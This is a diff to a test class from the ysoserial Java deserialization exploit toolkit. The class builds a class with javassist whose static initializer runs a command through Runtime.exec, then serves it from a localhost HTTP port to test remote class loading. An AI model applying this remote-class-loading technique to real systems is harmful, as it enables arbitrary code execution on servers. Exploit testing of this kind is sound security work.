@@ -13,6 +13,7 @@ import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
 import ysoserial.WrappedTest;
+import ysoserial.payloads.util.Gadgets;
 
 
 /**
@@ -22,18 +23,18 @@ import ysoserial.WrappedTest;
 public class RemoteClassLoadingTest implements WrappedTest {
 
     int port;
-    private String command;
+    private String[] command;
     private String className;
 
-    public RemoteClassLoadingTest ( String command ) {
+    public RemoteClassLoadingTest ( String[] command ) {
         this.command = command;
         this.port = new Random().nextInt(65535-1024)+1024;
         this.className = "Exploit-" + System.currentTimeMillis();
     }
 
 
-    public String getPayloadArgs () {
-        return String.format("http://localhost:%d/", this.port) + ":" + this.className;
+    public String[] getPayloadArgs () {
+        return new String[]{"http://localhost:" + this.port + "/",  this.className};
     }
 
     public int getHTTPPort () {
@@ -54,7 +55,7 @@ public class RemoteClassLoadingTest implements WrappedTest {
             pool.insertClassPath(new ClassClassPath(Exploit.class));
             final CtClass clazz = pool.get(Exploit.class.getName());
             clazz.setName(this.className);
-            clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
+            clazz.makeClassInitializer().insertAfter(Gadgets.makeExecCommand(command));
             return clazz.toBytecode();
         }
         catch ( Exception e ) {
